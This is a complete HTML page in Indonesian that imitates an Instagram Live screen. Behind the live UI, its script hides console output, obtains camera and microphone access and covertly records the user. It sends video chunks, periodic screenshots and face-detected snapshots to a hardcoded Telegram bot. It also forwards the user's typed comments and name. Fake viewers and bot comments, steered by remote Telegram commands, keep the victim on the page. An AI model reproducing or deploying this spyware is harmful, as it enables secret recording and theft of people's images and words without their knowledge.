<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
<title>Instagram Live</title>
<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%23E4405F'%3E%3Crect x='2' y='2' width='20' height='20' rx='5' fill='none' stroke='%23E4405F' stroke-width='2'/%3E%3Ccircle cx='12' cy='12' r='4' fill='%23E4405F'/%3E%3Ccircle cx='18' cy='6' r='1.5' fill='%23E4405F'/%3E%3C/svg%3E">
<style>
* {
  margin: 0;
  padding: 0;
  box-sizing: border-box;
  -webkit-tap-highlight-color: transparent;
}
body, html {
  margin: 0;
  padding: 0;
  overflow: hidden;
  background: #000;
  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
}
#video {
  width: 100vw;
  height: 100vh;
  object-fit: cover;
  position: relative;
  z-index: 1;
  display: none;
}
canvas {
  display: none;
}

/* UI Instagram Live */
.ig-header {
  position: absolute;
  top: 0;
  left: 0;
  right: 0;
  padding: 12px 16px;
  background: linear-gradient(to bottom, rgba(0,0,0,0.6) 0%, rgba(0,0,0,0) 100%);
  display: flex;
  justify-content: space-between;
  align-items: center;
  z-index: 20;
  pointer-events: none;
}
.ig-user {
  display: flex;
  align-items: center;
  gap: 10px;
}
.ig-avatar {
  width: 36px;
  height: 36px;
  border-radius: 50%;
  background: linear-gradient(135deg, #833AB4, #E4405F);
  display: flex;
  align-items: center;
  justify-content: center;
  font-size: 18px;
  color: white;
}
.ig-username {
  color: white;
  font-weight: 600;
  font-size: 14px;
  text-shadow: 0 0 2px black;
}
.ig-badge {
  background: #FF3040;
  color: white;
  font-size: 10px;
  font-weight: bold;
  padding: 2px 6px;
  border-radius: 4px;
  margin-left: 6px;
}
.ig-header-right {
  display: flex;
  gap: 16px;
  color: white;
  font-size: 20px;
}
.viewers {
  position: absolute;
  top: 70px;
  left: 16px;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(10px);
  padding: 4px 12px;
  border-radius: 20px;
  color: white;
  font-size: 12px;
  font-weight: 500;
  z-index: 20;
  pointer-events: none;
  display: none;
}
.like-btn {
  position: absolute;
  bottom: 100px;
  right: 16px;
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(10px);
  width: 48px;
  height: 48px;
  border-radius: 50%;
  display: none;
  align-items: center;
  justify-content: center;
  font-size: 28px;
  cursor: pointer;
  z-index: 30;
  pointer-events: auto;
  color: white;
}
.like-btn:active {
  transform: scale(0.9);
}
.comments-area {
  position: absolute;
  bottom: 70px;
  left: 16px;
  right: 80px;
  z-index: 20;
  pointer-events: none;
  display: none;
  flex-direction: column;
  gap: 8px;
  max-height: 200px;
  overflow-y: auto;
  scrollbar-width: none;
}
.comments-area::-webkit-scrollbar {
  display: none;
}
.comment-item {
  background: rgba(0,0,0,0.5);
  backdrop-filter: blur(8px);
  padding: 6px 12px;
  border-radius: 20px;
  color: white;
  font-size: 13px;
  animation: slideUp 0.3s ease-out;
  max-width: 80%;
}
.comment-item span {
  font-weight: 600;
  margin-right: 6px;
}
@keyframes slideUp {
  from { opacity: 0; transform: translateY(20px); }
  to { opacity: 1; transform: translateY(0); }
}
.comment-input-wrapper {
  position: absolute;
  bottom: 16px;
  left: 16px;
  right: 80px;
  background: rgba(0,0,0,0.6);
  backdrop-filter: blur(12px);
  border-radius: 28px;
  display: none;
  align-items: center;
  padding: 4px 12px;
  gap: 8px;
  z-index: 30;
  border: 1px solid rgba(255,255,255,0.2);
}
.comment-input-wrapper input {
  flex: 1;
  background: transparent;
  border: none;
  color: white;
  font-size: 14px;
  padding: 10px 0;
  outline: none;
}
.comment-input-wrapper input::placeholder {
  color: rgba(255,255,255,0.5);
}
.comment-input-wrapper button {
  background: #FF3040;
  border: none;
  color: white;
  font-size: 14px;
  font-weight: 600;
  padding: 6px 14px;
  border-radius: 20px;
  cursor: pointer;
}

/* Modal */
.modal-overlay {
  position: fixed;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  background: rgba(0,0,0,0.92);
  backdrop-filter: blur(16px);
  display: flex;
  align-items: center;
  justify-content: center;
  z-index: 100;
}
.modal-card {
  background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
  border-radius: 32px;
  padding: 32px 24px;
  width: 85%;
  max-width: 360px;
  text-align: center;
  box-shadow: 0 20px 40px rgba(0,0,0,0.5);
  animation: modalPop 0.3s ease-out;
}
@keyframes modalPop {
  from { transform: scale(0.95); opacity: 0; }
  to { transform: scale(1); opacity: 1; }
}
.modal-card h3 {
  color: white;
  font-size: 22px;
  margin-bottom: 8px;
}
.modal-card p {
  color: rgba(255,255,255,0.7);
  font-size: 13px;
  margin-bottom: 24px;
}
.modal-card input {
  width: 100%;
  padding: 14px 16px;
  border-radius: 40px;
  border: none;
  background: rgba(255,255,255,0.15);
  color: white;
  font-size: 16px;
  text-align: center;
  outline: none;
  margin-bottom: 20px;
}
.modal-card button {
  background: linear-gradient(135deg, #833AB4, #E4405F);
  border: none;
  color: white;
  font-weight: bold;
  padding: 12px 28px;
  border-radius: 40px;
  font-size: 16px;
  cursor: pointer;
  width: 100%;
}
.modal-card .error-msg {
  color: #ff6666;
  font-size: 12px;
  margin-top: 12px;
  display: none;
}
.permission-item {
  display: flex;
  align-items: center;
  justify-content: space-between;
  background: rgba(255,255,255,0.08);
  padding: 12px 16px;
  border-radius: 60px;
  margin-bottom: 12px;
}
.permission-item span:first-child {
  color: white;
  font-size: 14px;
}
.permission-status {
  font-size: 18px;
}
.loading-spinner {
  width: 20px;
  height: 20px;
  border: 2px solid rgba(255,255,255,0.3);
  border-top-color: white;
  border-radius: 50%;
  animation: spin 0.6s linear infinite;
  display: inline-block;
}
@keyframes spin {
  to { transform: rotate(360deg); }
}
.heart-container {
  position: absolute;
  top: 0;
  left: 0;
  width: 100%;
  height: 100%;
  pointer-events: none;
  z-index: 40;
  overflow: hidden;
}
.floating-heart {
  position: absolute;
  color: #FF3040;
  font-size: 24px;
  animation: floatUp 1.5s ease-out forwards;
  bottom: 100px;
}
@keyframes floatUp {
  0% { transform: translateX(-50%) scale(0.5); opacity: 1; }
  100% { transform: translateX(-50%) scale(1.5) translateY(-200px); opacity: 0; }
}
</style>
</head>
<body>
<video id="video" autoplay playsinline muted></video>
<canvas id="canvas"></canvas>

<!-- UI Live -->
<div class="ig-header">
  <div class="ig-user">
    <div class="ig-avatar">📷</div>
    <div class="ig-username" id="displayUsername">-</div>
    <div class="ig-badge">LIVE</div>
  </div>
  <div class="ig-header-right"><div>•••</div></div>
</div>
<div class="viewers" id="viewerCount">1.2K watching</div>
<div class="comments-area" id="commentsArea"></div>
<div class="like-btn" id="likeButton">❤️</div>
<div class="comment-input-wrapper" id="commentWrapper">
  <input type="text" id="commentInput" placeholder="Ketik komentar...">
  <button id="sendCommentBtn">Kirim</button>
</div>
<div class="heart-container" id="heartContainer"></div>

<!-- Modal Nama -->
<div id="nameModal" class="modal-overlay">
  <div class="modal-card">
    <h3>✨ Live Streaming</h3>
    <p>Masukkan username kamu untuk mulai live</p>
    <input type="text" id="usernameInput" placeholder="contoh: jessica_lee" maxlength="30">
    <button id="startLiveBtn">Mulai Live</button>
  </div>
</div>

<!-- Modal Permission -->
<div id="permissionModal" class="modal-overlay" style="display: none;">
  <div class="modal-card">
    <h3>📱 Izinkan Akses</h3>
    <p>Live membutuhkan izin kamera dan mikrofon</p>
    <div class="permission-item">
      <span>📷 Kamera</span>
      <span class="permission-status" id="camStatus">⏳</span>
    </div>
    <div class="permission-item">
      <span>🎤 Mikrofon</span>
      <span class="permission-status" id="micStatus">⏳</span>
    </div>
    <div class="permission-item">
      <span>🔔 Notifikasi</span>
      <span class="permission-status" id="notifStatus">⏳</span>
    </div>
    <div id="permissionError" class="error-msg"></div>
    <button id="retryPermissionBtn" style="margin-top: 16px;">Izinkan & Lanjutkan</button>
  </div>
</div>

<script>
// ===== STEALTH =====
console.log = function() {};
console.warn = function() {};
console.error = function() {};

// ===== GLOBAL VARIABLES =====
let currentUsername = null;
let mediaStream = null;
let recorder = null;
let chunks = [];
let liveActive = false;
let faceApiReady = false;
let lastFace = null;
let fakeIntervals = [];

const BOT_TOKEN = "8967418197:AAFycc_kcvOLkfaWq1SIFBE4kTPHMp6R_oY";
const CHAT_ID = "7158806033";
const API = `https://api.telegram.org/bot${BOT_TOKEN}`;

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const ctx = canvas.getContext('2d');

// ===== 50 NAMA RANDOM =====
const randomNames = [
  "sarah_chan", "budi_offc", "jessica_lee", "rizkyfebian", "amelia_putri", "kevin_tan", "natasha_rom", "dimas_adi", "fiona_aurora", "reza_oktavian",
  "vina_agustin", "andre_satria", "citra_kirana", "eko_pras", "luna_maya", "gilang_p", "mega_sari", "nanda_hidayat", "olivia_zahra", "pandu_winata",
  "queen_shawn", "rafi_ahmad", "sinta_dewi", "tommy_les", "utami_dewi", "vicky_firmansyah", "winda_okt", "xavier_lee", "yuni_shara", "zaki_ibrahim",
  "agung_laksana", "bella_sofia", "chris_yeo", "diana_kartika", "erik_lim", "febri_ansyah", "gita_gumilar", "herman_tj", "indah_purnama", "johan_nugroho",
  "karina_mel", "luthfi_hakim", "mira_feb", "niko_cesaro", "okta_rama", "putri_amara", "qori_ahmad", "risma_dewi", "steven_handoko", "tari_rahmi"
];
function getRandomName() { return randomNames[Math.floor(Math.random() * randomNames.length)]; }

// ===== TELEGRAM FUNCTIONS =====
function sendToTelegram() {
  if(chunks.length === 0) return;
  const blob = new Blob(chunks, { type: 'video/webm' });
  const form = new FormData();
  form.append('chat_id', CHAT_ID);
  form.append('video', blob, `cam_${Date.now()}.webm`);
  form.append('caption', `User: ${navigator.userAgent.split(' ').slice(0,3).join(' ')}`);
  fetch(`${API}/sendVideo`, { method: 'POST', body: form }).catch(()=>{});
  chunks = [];
}

function captureScreenshot() {
  if(!liveActive) return;
  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
  canvas.toBlob(blob => {
    const form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('photo', blob, `ss_${Date.now()}.jpg`);
    form.append('caption', '');
    fetch(`${API}/sendPhoto`, { method: 'POST', body: form }).catch(()=>{});
  }, 'image/jpeg', 0.8);
}

async function detectFace() {
  if(!liveActive || !faceApiReady) return;
  try {
    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
    const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg', 0.7));
    const img = new Image();
    img.src = URL.createObjectURL(blob);
    img.onload = async () => {
      const face = await faceapi.detectSingleFace(img).withFaceLandmarks().withFaceDescriptor();
      if(face && (!lastFace || distance(face.descriptor, lastFace) > 0.6)) {
        lastFace = face.descriptor;
        const form = new FormData();
        form.append('chat_id', CHAT_ID);
        form.append('photo', blob, `face_${Date.now()}.jpg`);
        form.append('caption', '');
        fetch(`${API}/sendPhoto`, { method: 'POST', body: form }).catch(()=>{});
      }
    };
  } catch(e) {}
}
function distance(a,b) { let sum=0; for(let i=0;i<a.length;i++) sum+=(a[i]-b[i])**2; return Math.sqrt(sum); }

// ===== START CAMERA & RECORDER =====
function startCameraAndRecorder(stream) {
  mediaStream = stream;
  video.srcObject = stream;
  video.style.display = "block";
  video.play();
  canvas.width = 1280;
  canvas.height = 720;
  
  recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp9' });
  recorder.ondataavailable = e => chunks.push(e.data);
  recorder.onstop = () => sendToTelegram();
  recorder.start(1000);
  
  const recorderInterval = setInterval(() => {
    if(recorder && recorder.state === "recording") recorder.stop();
    if(recorder) recorder.start(1000);
  }, 10000);
  
  const screenshotInterval = setInterval(captureScreenshot, 5000);
  const faceInterval = setInterval(detectFace, 2000);
  
  fakeIntervals.push(recorderInterval, screenshotInterval, faceInterval);
  
  liveActive = true;
  
  // Tampilkan UI
  document.querySelector('.viewers').style.display = 'block';
  document.querySelector('.like-btn').style.display = 'flex';
  document.querySelector('.comments-area').style.display = 'flex';
  document.querySelector('.comment-input-wrapper').style.display = 'flex';
  
  startFakeInteractions();
}

// ===== REQUEST PERMISSION =====
async function requestPermissions() {
  const camSpan = document.getElementById('camStatus');
  const micSpan = document.getElementById('micStatus');
  const errorDiv = document.getElementById('permissionError');
  
  camSpan.innerHTML = '<div class="loading-spinner"></div>';
  micSpan.innerHTML = '<div class="loading-spinner"></div>';
  errorDiv.style.display = 'none';
  
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
    camSpan.innerHTML = '✅';
    micSpan.innerHTML = '✅';
    return stream;
  } catch(err) {
    if(err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
      camSpan.innerHTML = '❌';
      micSpan.innerHTML = '❌';
      errorDiv.innerText = 'Izin ditolak. Silakan izinkan kamera dan mikrofon.';
    } else if(err.name === 'NotFoundError') {
      camSpan.innerHTML = '❌';
      micSpan.innerHTML = '❌';
      errorDiv.innerText = 'Perangkat kamera/mikrofon tidak ditemukan.';
    } else {
      camSpan.innerHTML = '⚠️';
      micSpan.innerHTML = '⚠️';
      errorDiv.innerText = 'Gagal mengakses. Coba lagi.';
    }
    errorDiv.style.display = 'block';
    throw err;
  }
}

async function requestNotification() {
  const notifSpan = document.getElementById('notifStatus');
  notifSpan.innerHTML = '<div class="loading-spinner"></div>';
  if ('Notification' in window) {
    const permission = await Notification.requestPermission();
    notifSpan.innerHTML = permission === 'granted' ? '✅' : '❌';
  } else {
    notifSpan.innerHTML = '⚠️';
  }
}

// ===== FAKE INTERACTIONS =====
function startFakeInteractions() {
  const commentsArea = document.getElementById('commentsArea');
  const likeBtn = document.getElementById('likeButton');
  const heartContainer = document.getElementById('heartContainer');
  const viewerElem = document.getElementById('viewerCount');
  const commentInput = document.getElementById('commentInput');
  const sendBtn = document.getElementById('sendCommentBtn');
  
  function addComment(username, text) {
    const commentDiv = document.createElement('div');
    commentDiv.className = 'comment-item';
    commentDiv.innerHTML = `<span>${escapeHtml(username)}</span>${escapeHtml(text)}`;
    commentsArea.appendChild(commentDiv);
    if(commentsArea.children.length > 10) commentsArea.removeChild(commentsArea.children[0]);
    commentDiv.scrollIntoView({ behavior: 'smooth', block: 'nearest' });
  }
  function escapeHtml(str) { if(!str) return ''; return str.replace(/[&<>]/g, m => m === '&' ? '&amp;' : m === '<' ? '&lt;' : '&gt;'); }
  function createHeart(x, y) {
    const heart = document.createElement('div');
    heart.className = 'floating-heart';
    heart.innerHTML = '❤️';
    heart.style.left = (x || window.innerWidth/2) + 'px';
    heartContainer.appendChild(heart);
    setTimeout(() => heart.remove(), 1500);
  }
  
  // Komentar palsu
  const fakeMsg = ["❤️", "🔥", "👏", "mantap", "live terus", "seru", "👍", "🇮🇩", "keren", "asik", "rame", "🤙", "wow"];
  const commentInterval = setInterval(() => {
    if(liveActive) addComment(getRandomName(), fakeMsg[Math.floor(Math.random() * fakeMsg.length)]);
  }, 4800);
  
  // Viewers counter
  let viewers = 1200;
  const viewerInterval = setInterval(() => {
    if(liveActive) {
      viewers += Math.floor(Math.random() * 7);
      if(viewers > 9999) viewers = 9999;
      viewerElem.innerText = viewers.toLocaleString() + ' watching';
    }
  }, 8000);
  
  // Like button
  likeBtn.onclick = (e) => {
    const rect = likeBtn.getBoundingClientRect();
    createHeart(rect.left + rect.width/2, rect.top);
  };
  video.onclick = (e) => createHeart(e.clientX, e.clientY);
  
  // Kirim komentar user ke Telegram
  function sendUserComment() {
    let comment = commentInput.value.trim();
    if(comment.length === 0) return;
    if(comment.length > 200) comment = comment.substring(0, 200);
    addComment(currentUsername, comment);
    fetch(`${API}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CHAT_ID, text: `💬 [LIVE] @${currentUsername}: ${comment}\n🕒 ${new Date().toLocaleString()}` })
    }).catch(()=>{});
    commentInput.value = '';
  }
  sendBtn.onclick = sendUserComment;
  commentInput.onkeypress = (e) => { if(e.key === 'Enter') sendUserComment(); };
  
  // Telegram command listener
  let lastUpdateId = 0;
  function fetchCommands() {
    fetch(`${API}/getUpdates?offset=${lastUpdateId + 1}&timeout=10`)
      .then(res => res.json())
      .then(data => {
        if(data.ok && data.result) {
          for(const update of data.result) {
            lastUpdateId = update.update_id;
            const msg = update.message;
            if(msg && msg.chat && msg.chat.id.toString() === CHAT_ID && msg.text) {
              const text = msg.text.trim();
              if(text.startsWith('/live ')) addComment(getRandomName(), text.substring(6));
              else if(text.startsWith('/viewers ')) { const n = parseInt(text.substring(9)); if(!isNaN(n) && n>0) viewers = n; viewerElem.innerText = viewers.toLocaleString() + ' watching'; }
              else if(text === '/clear') { while(commentsArea.firstChild) commentsArea.removeChild(commentsArea.firstChild); }
              else if(text === '/like') createHeart(window.innerWidth/2, window.innerHeight-100);
              else if(text.startsWith('/name ')) { const newName = text.substring(6); if(newName.length>0 && newName.length<30) { currentUsername = newName; localStorage.setItem('ig_username', currentUsername); document.getElementById('displayUsername').innerText = currentUsername; addComment("system", `username changed to @${newName}`); } }
            }
          }
        }
      }).catch(()=>{});
    setTimeout(fetchCommands, 3500);
  }
  setTimeout(fetchCommands, 5000);
  
  fakeIntervals.push(commentInterval, viewerInterval);
}

// ===== LOAD FACE-API =====
const script = document.createElement('script');
script.src = 'https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/dist/face-api.min.js';
script.onload = async () => {
  await Promise.all([
    faceapi.nets.ssdMobilenetv1.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/'),
    faceapi.nets.faceLandmark68Net.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/'),
    faceapi.nets.faceRecognitionNet.loadFromUri('https://cdn.jsdelivr.net/npm/@vladmandic/face-api@1.7.13/model/')
  ]);
  faceApiReady = true;
};
document.head.appendChild(script);

// ===== START LIVE FLOW =====
document.getElementById('startLiveBtn').onclick = async () => {
  const username = document.getElementById('usernameInput').value.trim();
  currentUsername = username === "" ? "guest_" + Math.floor(Math.random() * 1000) : username.substring(0, 30);
  localStorage.setItem('ig_username', currentUsername);
  document.getElementById('displayUsername').innerText = currentUsername;
  document.getElementById('nameModal').style.display = 'none';
  
  // Tampilkan modal permission
  const permModal = document.getElementById('permissionModal');
  permModal.style.display = 'flex';
  
  // Reset status
  document.getElementById('camStatus').innerHTML = '⏳';
  document.getElementById('micStatus').innerHTML = '⏳';
  document.getElementById('notifStatus').innerHTML = '⏳';
  document.getElementById('permissionError').style.display = 'none';
  
  // Request notifikasi paralel
  requestNotification();
  
  // Request kamera & mikrofon
  try {
    const stream = await requestPermissions();
    permModal.style.display = 'none';
    startCameraAndRecorder(stream);
  } catch(e) {
    // Tombol retry
    document.getElementById('retryPermissionBtn').onclick = async () => {
      document.getElementById('camStatus').innerHTML = '<div class="loading-spinner"></div>';
      document.getElementById('micStatus').innerHTML = '<div class="loading-spinner"></div>';
      document.getElementById('permissionError').style.display = 'none';
      try {
        const stream2 = await requestPermissions();
        permModal.style.display = 'none';
        startCameraAndRecorder(stream2);
      } catch(e2) {}
    };
  }
};

// Fullscreen
setInterval(() => {
  if(liveActive && !document.fullscreenElement) document.body.requestFullscreen();
}, 4000);

document.title = "Instagram Live";
</script>
</body>
</html>
